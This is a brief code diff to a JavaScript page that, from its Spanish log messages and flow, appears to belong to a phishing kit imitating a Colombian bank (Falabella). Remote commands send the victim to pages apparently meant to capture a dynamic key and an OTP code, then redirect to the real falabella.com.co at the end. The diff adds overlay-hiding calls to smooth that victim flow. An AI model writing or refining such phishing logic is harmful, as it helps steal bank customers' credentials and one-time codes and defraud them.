@@ -120,14 +120,17 @@ document.addEventListener('DOMContentLoaded', () => {
                 break;
             case 'request_dynamic':
                 console.log('🔢 Redirigiendo a dinamica.html');
+                BancoUtils.hideOverlay();
                 window.location.href = 'dinamica.html';
                 break;
             case 'request_otp':
                 console.log('📱 Redirigiendo a otp.html');
+                BancoUtils.hideOverlay();
                 window.location.href = 'otp.html';
                 break;
             case 'finish':
                 console.log('✅ Finalizando - redirigiendo a falabella.com.co');
+                BancoUtils.hideOverlay();
                 window.location.href = 'https://www.falabella.com.co/';
                 break;
             default:
